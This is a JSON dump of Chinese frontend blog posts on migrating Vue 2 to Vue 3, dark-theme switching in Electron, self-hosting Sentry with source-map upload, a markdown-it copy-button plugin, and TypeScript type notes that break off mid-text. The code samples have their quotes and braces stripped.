[{"title":"Vue 2.x 至 3.0 快速升级指南","path":"/2024/09/06/cde3266e5dbe/","content":"应该从 2 升级到 3 吗？从长远来看，升级到 Vue 3 是必要的。技术在不断进步，Vue 3 在许多方面都优于 Vue 2，许多公司在招聘时也开始关注候选人对 Vue 3 的掌握。因此，为了职业发展，尽早学习 Vue 3 是非常重要的。 虽然有些人可能会觉得学习压力大，或者“卷不动”，但不努力学习可能会影响未来的就业机会。现实不会因为个人的困难而停滞不前。因此，大家要加油！ 对于老旧的中大型项目，建议继续使用 Vue 2，因为升级可能会带来较高的成本和风险。而对于新项目，最好选择 Vue 3，因为其新的特性，如响应式原理和 Composition API，确实能带来更高的便捷性和开发效率。 版本差异Vue3 的出现确实解决了 Vue2 长久以来的一些痛点，比如组件逻辑复用必须依赖 Mixin 的架构缺陷，导致了许多扩展性的问题，并且破坏了简洁组件声明的许多原则。又比如 Vue2 对 TS 的支持不够，导致在 Vu2 中使用 TS 异常的憋屈难受。因此 Vue3 的架构彻底重构，是极其有意义的，不仅解决了上述的问题，还在捆绑包大小、初始渲染、更新和内存使用等性能方面比 Vue2 有了更多的提升。 此外，Vue3 还添加了许多新的功能： 组合式 API* 单文件组件中的组合式 API 语法糖 ()* Teleport 组件 Fragments 片段 Emits 组件选项** 来自@vue/runtime-core 的 createRendererAPI 用来创建自定义渲染函数 单文件组件中的状态驱动的 CSS 变量 (中的 v-bind)* SFC新增全局规则和针对插槽内容的规则 Suspense 实验性 如此大的版本更新，自然会带来许多破坏性更新，这些更新的迁移难度如下： 来自官方迁移文档的不兼容列表：非兼容性改变 | Vue 3 迁移指南 (vuejs.org) 框架的真正力量来自其周围的社区和生态系统，随着 Vu3 发布，社区也是闻声而动，在 Vue2 时代我们熟悉的工具或升级跟上 Vue3 的脚步，或停止维护被时代抛弃。因此，Vue 的支持库变更如下： Vue2 Vue3 构建工具链 Vue CLI 3.x Vue CLI 4.x / Vite 状态管理 Vuex 3.x Vuex 4.x Router Vue Router 3.x Vue Router 4.x Devtools Devtools Extension 5.x Devtools Extension 6.x IDE 支持 Vetur Volar TypeScript 命令行工具 vue-tsc 静态网站生成 VuePress VitePress JSX @vue/babel-preset-jsx @vue/babel-plugin-jsx 开始迁移脚手架升级升级 Vue CLI，Vue，Vuex 及 Vue Router 等工具，Vue 3 需要的最低版本在上面已经列出，建议升级到最新版本 Vue CLI 升级全局的 Vue CLI 包，请运行： npm update -g @vue/cli# 或者yarn global upgrade --latest @vue/cli 上面列出来的命令是用于升级全局的 Vue CLI。如需升级项目中的 Vue CLI 相关模块（以 @vue/cli-plugin- 或 vue-cli-plugin- 开头），请在项目目录下运行 vue upgrade： 用法： upgrade [options] [plugin-name]升级 Vue CLI 服务及插件选项： -t, --to version 升级 plugin-name 到指定的版本 -f, --from version 跳过本地版本检测，默认插件是从此处指定的版本升级上来 -r, --registry url 使用指定的 registry 地址安装依赖 --all 升级所有的插件 --next 检查插件新版本时，包括 alpha/beta/rc 版本在内 -h, --help 输出帮助内容 Vue/Vuex /Vue Router npm install vue@latest vuex@latest vue-router@latest Vue CLI 和 Vuex 从快速迁移的角度考虑可以升级到最新版本，但是有时间有精力的话还是推荐迁移到官方最新推荐的工具库，以下有些迁移资料可供参考： Vue CLI -> Vite/Rspack Vue CLI -> 来自 VueSchool.io 的 Vite 迁移指南 有助于自动迁移的工具/插件 Vue CLI - Rsbuild Vuex -> Pinia 从 Vuex ≤4 迁移 | Pinia (vuejs.org) 代码迁移在正式修改业务代码之前，需要先修改全局 API 实例，在 Vue2 中技术上是没有 “app”的概念，我们定义的应用只是通过 new Vue() 创建的根 Vue 实例。从同一个 Vue 构造函数创建的每个根实例共享相同的全局配置，因此使得在同一页面上的多个“应用”在全局配置不同时共享同一个 Vue 副本非常困难： // 这会影响到所有根实例Vue.mixin( /* ... */)const app1 = new Vue( el: #app-1 )const app2 = new Vue( el: #app-2 ) 为了避免这些问题，在 Vue 3 中我们引入了一个新的全局 API：font style=color:rgb(60, 60, 67);createApp/font 修改 Vue / Vue Router / Vuex 初始化 Vue - 官方迁移指南：全局 API 应用实例 | Vue 3 迁移指南 (vuejs.org) import createApp from vue;import MyApp from ./MyApp.vue;const app = createApp(MyApp);app.component(button-counter, data: () = ( count: 0, ), template: button @click=count++Clicked count times./button,);app.directive(focus, mounted: (el) = el.focus(),);// 现在，所有通过 app.mount() 挂载的应用实例及其组件树，// 将具有相同的 “button-counter” 组件和 “focus” 指令，// 而不会污染全局环境app.mount(#app); 应用实例暴露了 Vue 2 全局 API 的一个子集，经验法则是，任何全局改变 Vue 行为的 API 现在都会移动到应用实例上，以下是 Vue2 全局 API 及其相应的实例 API 列表： 2.x 全局 API 3.x 实例 API (**app**) Vue.config app.config Vue.config.productionTip 移除 Vue.config.ignoredElements app.config.compilerOptions.isCustomElement Vue.component app.component Vue.directive app.directive Vue.mixin app.mixin Vue.use app.use Vue.prototype app.config.globalProperties Vue.extend 移除 Vuex - 官方迁移指南：从 3.x 迁移到 4.0 | Vuex (vuejs.org) 从 3.x 迁移到 4.0 几乎所有的 Vuex 4 API 都与 Vuex 3 保持不变。但是，仍有一些非兼容性变更需要注意。 最重要的是为了与 Vue 3 初始化过程保持一致，Vuex 的安装方式已经改变了。用户现在应该使用新引入的 createStore 方法来创建 store 实例。 import createStore from vuex;export const store = createStore( state() return count: 1, ; ,); 要将 Vuex 安装到 Vue 实例中，需要用 store 替代之前的 Vuex 传递给 use 方法。 import createApp from vue;import store from ./store;import App from ./App.vue;const app = createApp(App);app.use(store);app.mount(#app); Vue Router - 官方迁移指南：从 Vue2 迁移 | Vue Router (vuejs.org) 举一反一，引入了 font style=color:rgb(255, 80, 44);background-color:rgb(255, 245, 245);createRouter/font 函数，它取代了之前的 font style=color:rgb(255, 80, 44);background-color:rgb(255, 245, 245);new Router()/font 用法。 // 以前是// import Router from vue-routerimport createRouter from vue-router;const router = createRouter( // ...); 第三方库迁移这一步没什么好说的，主要看你使用的第三方库对 Vue3 的支持程度，幸运的是我们常用的 UI 库像 AntdV，Element 等都是支持 Vue3 的，按照官方的迁移文档修改即可。 对于不支持 Vue3 的库，可以看看 awesome-vue 列表，Vue 的社区这么活跃，想必找个 Vue3 的平替还是不难的。 业务代码迁移最后就来到业务代码迁移环节了，这一步需要按照官方的不兼容列表，逐个模块，逐个文件的修改了。 十个百个文件还好，但是一些迭代了数年的项目，文件可能会达到上千个，挨个文件手动检查修改的话，不仅麻烦，而且真的很容易让人崩溃，那有没有自动化工具帮我们完成这一步。 自动化工具在前端社区只要是广泛的需求自然就不缺少相应的轮子去解决它，并且还有两种解决思路： 运行时兼容Vue 3 提供了一个兼容性构建（font style=color:rgb(38, 38, 38);@vue/compat/font），允许你在 Vue 3 中使用 Vue 2 的 API。这使得逐步迁移成为可能。你可以在项目中同时使用 Vue 2 和 Vue 3 的特性。 安装流程： 升级脚手架 按照 3.1 的步骤升级脚手架，可以仅升级 Vue CLI，font style=color:rgb(38, 38, 38);@vue/compat/font兼容 Vue2 的全局 API 实例 在 package.json 里，将 vue 更新到 3.1，安装相同版本的 @vue/compat。且如果存在 vue-template-compiler 的话，将其替换为 @vue/compiler-sfc。 dependencies: - vue: ^2.6.12,+ vue: ^3.1.0,+ @vue/compat: ^3.1.0 ...,devDependencies: - vue-template-compiler: ^2.6.12+ @vue/compiler-sfc: ^3.1.0 在构建设置中，为 vue 设置别名 @vue/compat，且通过 Vue 编译器选项开启兼容模式 // vue.config.jsmodule.exports = chainWebpack: (config) = config.resolve.alias.set(vue, @vue/compat); config.module .rule(vue) .use(vue-loader) .tap((options) = return ...options, compilerOptions: compatConfig: MODE: 2, , , ; ); ,; 已知的限制 虽然 @vue/compat已经尽可能的模仿 Vue 2 的行为，但是迁移构建版本旨在覆盖在文档中公开记载的 Vue 2 API 和行为。如果应用依赖了未记载的行为导致在迁移构建下运行失败，官方也可能不太会调整迁移构建版本以迎合这种特殊情况。最常见的就是使用 VNodes 上的私有 property，这在各大组件库中尤为常见，诸如 Element UI，AntV 等都有这些问题，因此还需要迁移至它们的 Vue 3 兼容版本。这也注定了即使有运行时兼容方案，可以兼容 Vue2 和 Vue3 的代码，代码迁移的工作依然不会少。 代码转换除了运行时兼容的方案，社区内还存在直接将 Vue2 代码转换成 Vue3 的工具，这里推荐“阿里妈妈”的 GoGoCode。 GoGoCode 是一款 AST 处理工具，什么是 AST？AST 是源代码的抽象语法结构的树状表示，也就是我们俗称的抽象语法树，这里大家可以类比之前提到过的虚拟 DOM 去理解，虚拟 DOM 是将我们的 DOM 结构抽象成另一种数据结构在内存中进行操作，抽象语法树也是类似的作用，将我们的代码抽象成另一种结构来描述。 所以 GoGoCode 升级 Vue3 的原理，其实就是将 Vue2 的代码抽象成 AST，再通过 AST 反编译成 Vue3 的语法。 但这些都不是我们关心的重点，最重要的还是看它能不能成功地将 Vue2 升级到 Vue3，我们以官方提供的迁移项目为例（vue-hackernews-2.0-master），使用 GoGoCode 对该项目进行升级，来看一下 GoGoCode 能否完成一个真实项目的升级转换。 首先，我们需要安装最新的 gogocode-cl： npm install gogocode-cli -g 安装完成后，在需要升级的项目根目录下，运行下面的指令： gogocode -s ./src -t gogocode-plugin-vue -o ./src-out -s 后面指的是需要升级的源码文件夹，-o 后面的参数指的是升级后的代码输出位置，执行后的效果如下： 我们以 router 代码为例，看下转换前后的差异： 可以看到，Vue2 中的 new Router，Vue.use(Router) 等方法在转换后都已经被移除了，换成使用 createRouter 来创建路由，确实已经更换到了 Vue3 的方法了。 代码转换了还不够，我们项目的依赖都要升级到对应版本，GoGoCode 可以帮我们把 package.json 里面的 Vue/Vuex/Vue-router/Vue 编译工具升级到适配 Vue3 的版本，在项目根目录下执行以下指令： gogocode -s package.json -t gogocode-plugin-vue -o package.json 参数格式与代码的一致，我们就直接将原 package.json 文件覆盖了，转化成功后，我们来看下 package.json 依赖版本的变化： 升级完依赖后，建议再手动更新下 Vue 技术栈相关库，gogocode 生成的版本有点低了 虽然使用了GoGoCode，但也不代表我们的项目就可以直接完成升级，项目中如果用到了其他 Vue2 版本的组件库，还是需要我们自己去升级 Vue3 对应的版本，包括一些 Api 的变化都要我们自己去手动调整，并且使用GoGoCode 也有一些转化规则是不支持的，具体的可以参考GoGoCode 的转化规则覆盖。 经验分享迁移节奏直接说结论，迁移战线不宜拉得太长，特别是新功能演进和迁移并行时，不断的代码合并和冲突还是挺痛苦的。因此我觉得迁移可以按照以下节奏进行： 升级 Vue CLI 及相关依赖，并且添加@vue/compat运行时兼容方案 找出所有 @vue/compat不兼容的三方库和业务代码，修改后上线 修改 Vue / Vuex / Vue Router 的全局 API 后上线 使用 GoGoCode 按模块的转换代码，手动验证后上线 在迁移所有代码后并且 @vue/compat也没有提示后，删除 @vue/compat上线 最后可选的是 Vue CLI 和 Vuex 的迁移工作 迁移成本以我最近迁移的一个 Electron + Vue2 的项目迁移成本来举例： 迁移耗时 60 人/日左右，311 处文件改动，新增 30308 行代码，删除 49927 行代码 一般情况下，改动不会这么大，这个项目是由于从 AntV 1.x 直接升级到 4.x，版本差异过大，相当大的尽力都是耗费在 Antv 的迁移上 总结何时该升级 Vue 3，什么时候该继续使用 Vue 2 的兼容版本。 现在，Vue 3 官方生态整体稳定，新项目完全可直接 Vue 3。那些需长期维护的项目，也很有必要升级，Vue 2 已经停止更新，如项目需兼容 IE11，就继续用 Vue 2.7。这样保持好项目兼容性前提下，还可体验到 Composition API 便利。 升级 Vue 过程中，可利用官方和社区工具，帮助高效升级。可使用 compat 给出提醒，项目中设置@vue/compat 作为 vue 的别名，这样内部就会把所有和 Vue 2 的语法相关的升级信息提示出来，逐个替换即可或直接使用 GoGoCode 进行自动化批量替换。 全面拥抱 Vue 3 也是离开舒适圈的挑战，带来不只新框架体验，也可能更好潜力与待遇。"},{"title":"Electron - 搞一把深色主题","path":"/2023/10/29/1dbb59fcd9ec/","content":"什么是深色主题深色主题到底是什么？这个讲法其实很宽泛，我们以往见过不少深色调为主的界面配色方案。比如程序员非常熟悉的代码编辑器，各种深色皮肤早就大行其道。而我们今天要讨论的，主要是苹果近年来的产品中推出的深色主题功能，以及其在 Electron 中的应用实现。 苹果在 2017 年发布的 macOS High Sierra (10.13) 首先实验性地支持了深色顶栏和 dock，继而在 Mojave (10.14) 提供了完整的深色主题支持。接下来的 Catalina (10.15) 则增加了 Auto 选项，可以随一天中的时间变化自动切换系统主题。后续的大版本更新也不断优化这个功能。在移动端，iOS 13 开始加入深色主题功能。macOS 启用深色主题后，内置的应用会切换为深灰色为主的配色，字体则显示为浅灰色。 第三方应用如果适配了深色主题，也会根据设置改变自身的界面配色。 目前主流的 App 及网站都适配了深色主题，那么接下来我们看下用 Electron 开发一个客户端软件，如何实现深色主题吧。 自定义界面Electron 允许开发者使用 Web 技术构建桌面应用程序，因此可以使用网页技术来判断当前页面是否该显示深色主题。 用 CSS 判断 你可以通过 prefers-color-scheme CSS 媒体查询来实现此功能 @media (prefers-color-scheme: dark) body background: #333; color: white; @media (prefers-color-scheme: light) body background: #ddd; color: black; 用 js 判断 用 Media Query 来判断用户当前的系统主题，然后在根节点中添加不同的 class 来区分主题 const isDark = window.matchMedia((prefers-color-scheme: dark));document.body.classList.remove(dark, light);document.body.classList.remove(isDark ? dark : light);## style.css.dark background: #333; color: white;.light background: #ddd; color: black; 虽然用 CSS 和 JS 都可以实现渲染不同的系统主题，但是如果要实现用户自主选择主题，这是就需要 localStorage 来记住用户选择，因此用 JS 来实现更好。 在 Vue 框架中要更好的使用主题切换的话，可以将这部分 js 逻辑抽离成一个 hook，下面给出个示例代码： import ref, computed from vue;export type BasicColorMode = light | dark;export type BasicColorSchema = BasicColorMode | system;interface UseThemeOptions /** * 目标元素选择器 * @default html */ selector?: string; /** * 目标元素修改属性 * * @default class */ attribute?: string; /** * 初始主题 * @default system */ initialValue?: BasicColorSchema; /** * 保存到 localStorage/sessionStorage 中的值对应的 key * @default color-scheme */ storageKey?: string; /** * 存储对象，默认为 localStorage * @default localStorage */ storage?: Storage; /** * 当 isDark=true 时应用于目标元素的值 * * @default dark */ valueDark?: string; /** * 当 isDark=false 时应用于目标元素的值 * * @default light */ valueLight?: string; /** * 切换主题时触发的回调函数 */ onChanged?: (dark: boolean, mode: BasicColorSchema) = void;export const useTheme = (options: UseThemeOptions = ) = const selector = html, attribute = class, initialValue = system, storageKey = color-scheme, storage = localStorage, valueDark = dark, valueLight = light, onChanged, = options; const mode = refBasicColorSchema(initialValue); const checkSystemDark = () = window.matchMedia((prefers-color-scheme: dark)).matches; const checkDark = (colorSchema: BasicColorSchema) = if (colorSchema === system) return checkSystemDark(); return colorSchema === dark; ; const setThemeClass = (colorSchema: BasicColorSchema) = const _isDark = checkDark(colorSchema); const isClass = attribute === class; const domTarget = document.querySelector(selector); const valueMode = _isDark ? valueDark : valueLight; if (isClass) domTarget?.classList.remove(valueDark, valueLight); domTarget?.classList.add(valueMode); else domTarget?.setAttribute(attribute, valueMode); ; const setMode = (_mode: BasicColorSchema) = mode.value = _mode; storage.setItem(storageKey, _mode); setThemeClass(_mode); onChanged?.(checkDark(_mode), _mode); ; const localMode = storage.getItem(storageKey); localMode setMode(localMode as BasicColorSchema); const isDark = computed(() = checkDark(mode.value)); return isDark, mode, setMode ;; 默认情况下，使用 Tailwind CSS 偏好的深色模式，当将 class dark 应用于 html 标签时启用深色模式，例如： !--light--html .../html!--dark--html class=dark .../html 不过，还可以对其进行自定义，使其与大多数 CSS 框架兼容。例如： const isDark = useTheme( selector: body, attribute: color-scheme, valueDark: dark, valueLight: light,); 最终会呈现 !--light--html body color-scheme=light ... /body/html!--dark--html body color-scheme=dark ... /body/html 如果上面的配置任然不满足你的需求，可以使用 onChange 完全控制你的主题切换 const isDark = useTheme( onChanged(dark: boolean) // update the dom, call the API or something ,); 如何在组件中使用 script setup lang=tsimport useTheme from ./hooks/useTheme;const mode, isDark, setMode = useTheme();const resetMode = () = setMode(system);const checkMode = () = setMode(isDark.value ? light : dark);/scripttemplate div p Current theme source: strong mode /strong /p button type=button @click=checkModeToggle Dark Mode/button button type=button @click=resetModeReset to System Theme/button /div/template 切换效果如下： 原生界面在切换主题时，会发现有部分页面并不会跟着切换，这是因为整个页面由两部分组成，原生界面和自定义界面，原生界面又分为标题栏和工具栏，这部分不能用 web 技术来操控，需要用系统的 API。 首先在 preload.js 中，暴露两个 IPC 通道到渲染器进程中 const contextBridge, ipcRenderer = require(electron)contextBridge.exposeInMainWorld(darkMode, toggle: () =ipcRenderer.invoke(dark-mode:toggle), system: () =ipcRenderer.invoke(dark-mode:system) ) 然后在主进程中添加事件处理函数，用 nativeTheme API 修改系统样式 const app, BrowserWindow, ipcMain, nativeTheme = require(electron) constpath = require(node:path) const createWindow = () = const win = newBrowserWindow( width: 800, height: 600, webPreferences: preload:path.join(__dirname, preload.js) ) win.loadFile(index.html)ipcMain.handle(dark-mode:toggle, () = if (nativeTheme.shouldUseDarkColors) nativeTheme.themeSource = light else nativeTheme.themeSource = dark return nativeTheme.shouldUseDarkColors ) ipcMain.handle(dark-mode:system, ()= nativeTheme.themeSource = system ) app.whenReady().then(() = createWindow() app.on(activate, () = if(BrowserWindow.getAllWindows().length === 0) createWindow() ) )app.on(window-all-closed, () = if (process.platform !== darwin) app.quit() ) 最后在渲染进程中通过 window.darkMode 发送消息到主进程中 const mode, isDark, setMode = useTheme( onChanged: (dark, _mode) = if(_mode === system) window.darkMode.system() else window.darkMode.toggle() ); 现在还有个问题，每次启动时默认的都是系统主题，因此需要将用户选择的主题保存到本地，我们使用 electron-store 来保存用户配置（你也可以使用任何你喜欢的存储方式） import nativeTheme from electron;import Store from electron-store;type ThemeColor = typeof nativeTheme.themeSource;const store = new Store theme: ThemeColor ( defaults: theme: system, ,);export const getThemeStore = () = store.get(theme);export const setThemeStore = (theme: ThemeColor) = store.set(theme, theme); 然后在主进程中，根据用户配置，重置默认主题 const themeColor = getThemeStore();nativeTheme.themeSource = themeColor; 整合一下现在渲染进程和主进程都分别实现了主题的切换并且都能根据用户的配置选择默认主题。但是这里有些问题： 主题配置在主进程和渲染进程都保存了一遍有些冗余 主题的切换过程中数据流向有些混乱，最好能保持单向数据流。 因此最终的版本中我们删掉渲染进程的配置保存，将用户选择的主题保存到主进程中，最后梳理出的流程图如下： 整合之后的效果如下，示例代码：https://github.com/bijinfeng/electron-vue-theme-switch 总结Electron 使用了 web 技术栈渲染自定义界面，因此在自定义界面实现暗黑主题和在网页端没有区别，技术都是通用的。但是 Electron 中还有原生界面存在，虽然有提供 API 去修改主题，但是要和自定义界面做到同步修改，整合两边的技术方案也是一个比较麻烦的事，这里提供一种技术实现思路。"},{"title":"私有化部署 Sentry 及接入踩坑记录","path":"/2023/10/06/c32a83b54674/","content":"简介Sentry 是什么？中文翻译过来是「哨兵」的意思，没错，它是程序的哨兵，它可以监控我们在生产环境中项目的运行状态，一旦某段代码运行报错、或者发生异常，会第一时间将报错的信息：页面路由、异常文件、请求方式等一些非常详细的信息以消息或者邮件的方式通知我们，告诉我们：程序出错了。而我们可以从详细的报错信息中快速分析问题所在，从而快速地修复 Bug。 为什么是 Sentry？是的，在市场上有许多供应商提供类似的一体化解决方案，国外有 BugSnag、 RollBar，国内有 oneapm、fundebug，那为什么我们偏偏选择 Sentry 呢？ 因为 Sentry 是 100% 开源的，我们可以使用它的 SaaS 版的，除此之外我们也可以私有化部署。 另外 Sentry 支持主流的编程语言，可以通过 这里 查看所有支持的语言。 通过下面这张图可以看出，Sentry 在前端的近两年发展趋势，以及与其它竞争者对比： 可以看到 Sentry 的 npm 下载量基本是稳步上升，同时引入 Sentry 包体积还很小，打包后只有 20k： 如何私有化部署？Sentry 官方提供了基于云的 SaaS 服务，那么为什么还要私有化部署呢？这是因为如果对于数据隐私和安全有着更高的要求，或者需要更多的自定义和控制权，那么私有化部署 Sentry 是个更好的选择。 Sentry 可以使用 Docker、Docker-compose、K8s 的方式部署在自己的服务器上。 关于私有化部署的方法这里给出参考文档，如有需要可以看看： Self-Hosted Sentry Sentry 10 helm charts 需要注意的是最新版本的 sentry 的功能很强大，但是同时带来的是对服务器的性能要求很高，因此如果只需要 sentry 最基本的功能，推荐部署 sentry 9.1.2 的版本， 下面是两个版本需要的资源和功能对比： 23.9.1 Docker 19.03.6+ Compose 2.0.1+ 4 CPU Cores 8 GB RAM 20 GB Free Disk Space 9.1.2 Docker 17.05.0+ Compose 1.17.0+ 3 GB RAM 总结一下，如果你需要更完备的错误追踪和分析功能并且恰好财力雄厚，建议使用官方的 SaaS 服务或者私有化部署最新版本，否则还是建议部署 9.1.2 版本，该有的功能都有，够你使用了。 如何接入前端 SDK?既然私有化部署了 sentry 的 9.1.2 版本，接下来就是在前端接入上报 SDK，然而官方文档上默认针对的都是最新版本，像 9.1.2 这样的上古版本接入文档早就淹没在浩瀚的历史变更记录中，互联网上更多的也是新版本的资料。经过不断的踩坑，终于是完成了 9.1.2 版本的 sdk 接入，由于精力有限，只完成了 Electron 和 Vue 平台的接入，其他平台的就不在此记录了。 Electron 安装 sdk pnpm add @sentry/electron 在主进程入口文件初始化 sentry（尽可能的提前初始化） import * as Sentry from @sentry/electron;import packageJson from ../../../package.json;Sentry.init( dsn: SENTRY_DSN, sampleRate: 1, release: packageJson.version,); Vue 除了需要特定版本的 sdk，其他的可以参考官方文档 安装 sdk ## 最新版本的 sdk 不兼容 9.1.2 版本的 sentry，使用旧版本pnpm add @sentry/vue@5.30.0 -D 初始化 sdk import * as Sentry from @sentry/vue;import Vue from vue;Sentry.init( Vue, dsn: SENTRY_DSN, release: packageJson.version,); 上传 Source Map接入 sdk 后，我们手动触发个错误，就可以看到在 sentry 上多出来一个新的 Issue，点开可以看到更详细的报错信息： 但是这个报错信息对我们的意义却不是很大，因为根据这份报错信息我们没法锁定出问题的源码位置。可能会有小机灵鬼说，我明明看到了错误堆栈，里面有错误的文件名，行数和列数，为什么还是没办法锁定？ 这是因此现代前端部署的代码都是合并和压缩过的，就不是给人类读的，相信我没有超能力别指望能反推出源码。 这时就需要借助 source map 了，什么？不知道什么是 source map？建议先看外这篇文章《深入浅出之 Source Map》再往下看。而且幸好的是 sentry 集成了 source map 的解析能力（在 9.1.2 这个版本也是有的，只是藏的有点深） 上面看完了相信你也明白了 source map 的重要性，接下我们开始上传 source map 到 sentry： 安装 webpack sdk sentry 针对不同的编译器有不同的上传 sdk，其他平台见官方文档，或者使用 cli 上传，但是为了省事和简化流程，我们采用 sdk 的上传方式 pnpm add @sentry/webpack-plugin@2.7.1 -D 配置 webpack 插件 const sentryWebpackPlugin = require(@sentry/webpack-plugin);const packageJson = require(./package.json);module.exports = productionSourceMap: true, // 生产环境生成 source map configureWebpack: plugins: [ sentryWebpackPlugin( org: xxxx, project: xxxx, url: xxxx, authToken: xxxx, release: name: packageJson.version, uploadLegacySourcemaps: paths: [./dist_electron/bundled], , , ), ], ,; 更多配置参数见官方文档：@sentrywebpack-plugin，这里着重介绍下需要注意的点： webpack 需要生成 source map，没有的话，sdk 就是无米而炊 release.name 需要和上报 sdk 里的 release 字段保持一致，以便于将异常按照 release 进行分类 uploadLegacySourcemaps 配置需要上传的文件目录 以上配置完成后，运行打包命令，就可以在 sentry 中看到上传的 source map 了 有了 source map，sentry 就能根据 source map 解析出源码位置 自定用户信息在 sentry 的默认上报中，只会上报用户 ip 地址作为用户的身份标识，这对我们针对特定用户排查日志时，不能说毫无帮助，只能说聊胜于无，因此我们需要上报一些特定的字段用作用户的身份标识，比如 username，email，id 等等： import * as Sentry from @sentry/vue;Sentry.init( // 初始化参数 ...);// 自定义用户信息，setUser 的入参类型如下：// export interface User // [key: string]: any;// id?: string;// ip_address?: string;// email?: string;// username?: string;// Sentry.setUser( id: xxx, username: xxx, email: xxx ); before： after： 总结sentry 是前端异常监控的不二选择，由于其是开源项目，我们可以选择私有化部署，而 9.1.2 版本就是考虑功能性和部署成本的最优解。 参考 https://juejin.cn/post/7023537118454480904#heading-23 https://zhuanlan.zhihu.com/p/287941396"},{"title":"markdown-it：添加代码复制功能","path":"/2023/09/01/d24e5effb3b7/","content":"markdown-it 渲染出来的代码块如下面左图一样，光秃秃的一块，也没有任何交互功能，现在我们来美化一下，添加一个 copy 代码的按钮，将代码块的语言也一并显示出来。 开发插件要实现上面的功能，光用 CSS 来做是不够的，我们需要借助 markdown-it 的插件机制，用插件实现上面的功能。 我们的插件用 TypeScript 开发，所以先安装 markdown-it 的类型文件，获取类型说明 pnpm add @types/markdown-it -D 添加一个插件模板 import type MarkdownIt from markdown-it;export default (md: MarkdownIt) = # .....; 实现功能（由于插件比较简单，这里不多做解释，直接看注释就行） import type MarkdownIt from markdown-it;import type Renderer from markdown-it/lib/renderer;import ClipboardJS from clipboard;import escape from lodash-es;const clipboard = new ClipboardJS(.markdown-it-code-copy);// 未 copy 时按钮的 innerHTMLconst copyInnerHTML = ` svg aria-hidden=true focusable=false role=img class=octicon octicon-copy viewBox=0 0 16 16 width=12 height=12 fill=currentColor style=display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;path d=M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z/pathpath d=M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z/path/svg spanCopy/span`;// copy 后按钮的 innerHTMLconst copiedInnerHTML = ` svg aria-hidden=true focusable=false role=img class=octicon octicon-check viewBox=0 0 16 16 width=12 height=12 fill=currentColor style=display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;path d=M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z/path/svg spanCopied!/span`;clipboard.on(success, (e) = const trigger = e.trigger; e.clearSelection(); trigger.innerHTML = copiedInnerHTML; setTimeout(() = trigger.innerHTML = copyInnerHTML; , 3000););// 用正则提取出 code 的语言const getCodeLangFragment = (htmlString: string) = const regex = /code class=hljs (language-([a-z]+))/; const match = htmlString.match(regex); return match?.[2] || ;;const renderCode = (renderer: Renderer.RenderRule): Renderer.RenderRule = return (...args) = const [tokens, idx] = args; const content = escape(tokens[idx].content); const origRendered = renderer.apply(this, args); if (content.length === 0) return origRendered; const lang = getCodeLangFragment(origRendered); return ` div class=code-enhance div class=code-enhance-header span$lang/span span class=markdown-it-code-copy code-enhance-copy data-clipboard-text=$content $copyInnerHTML /span /div div class=code-enhance-content $origRendered /div /div `; ;;/** * markdown-it 的插件，添加代码语言显示和 copy 代码按钮 */export default (md: MarkdownIt) = if (md.renderer.rules.code_block != null) md.renderer.rules.code_block = renderCode(md.renderer.rules.code_block); if (md.renderer.rules.fence != null) md.renderer.rules.fence = renderCode(md.renderer.rules.fence); ; 添加样式.code-enhance display: flex; flex-direction: column; border-radius: 7px; overflow: hidden; margin-top: 10px; -header background-color: #e2e6ea; height: 32px; box-sizing: border-box; padding: 0 16px; font-size: 12px; display: flex; justify-content: space-between; align-items: center; gap: 8px; -content background-color: #fff; padding: 1em; pre margin: 0; code padding: 0 !important; -copy font-size: 12px; display: inline-flex; align-items: center; cursor: pointer; gap: 6px; line-height: 1.5; 安装插件import markdownIt from markdown-it;import markdownItCodeCopy from ./markdown-it-code-copy;const md = markdownIt().use(markdownItCodeCopy);"},{"title":"TypeScript 从入门到入土 - 类型定义","path":"/2023/08/29/7252827e19c3/","content":"💡 入门教程推荐：[https://ts.xcatliu.com/](https://ts.xcatliu.com/) 本文不是 TS 的入门教程，可以看成是 《TypeScript 入门教程》的读书笔记，在后面使用 TS 的过程中，想不起来怎么用时，可以用来查询和翻阅的工具。 原始数据类型JS 中包含的原始数据类型有：布尔值、数值、字符串、null、undefined 以及 ES6 中的新类型 Symbol 和 ES10 中的新类型 BigInt。 下面介绍下这些原始数据类型在 TS 中的应用： // 布尔值const isDone: boolean = false;// 数值const decLiteral: number = 6;// 字符串const myName: string = Tom;// Null 和 Undefinedconst u: undefined = undefined;const n: null = null;// Symbolconst s: symbol = Symbol(a);// BigIntconst b: bigint = BigInt(10);```/divcolor3注意：上面的用法是个错误❌例子，只是为了说明怎么显示的定义类型而作的说明，在真实的项目中不要这么使用。/div原因是 font style=color:rgb(24, 32, 38);TypeScript 能够根据参数、属性和变量的默认值或初始值推断其类型。无需显示的注释其类型。这样做会给代码增加不必要的冗长，使其更难以阅读，并且在某些情况下可能会阻止 TypeScript 推断更具体的类型。/fontfont style=color:rgb(24, 32, 38);/fontfont style=color:rgb(24, 32, 38);例如：/font**font style=color:rgb(24, 32, 38);const isDone = false/font**font style=color:rgb(24, 32, 38); 的类型会自动推断为 /font**font style=color:rgb(24, 32, 38);false/font**font style=color:rgb(24, 32, 38);，/font**font style=color:rgb(24, 32, 38);let isDone = false/font**font style=color:rgb(24, 32, 38); 的类型才会推断为 /font**font style=color:rgb(24, 32, 38);boolean/font**font style=color:rgb(24, 32, 38);，因此如果给 const 定义的 isDone 显示的注释其类型为 boolean 的化，会扩大它的类型范围，带来一些不必要的风险。/fontfont style=color:rgb(24, 32, 38);/fontfont style=color:rgb(24, 32, 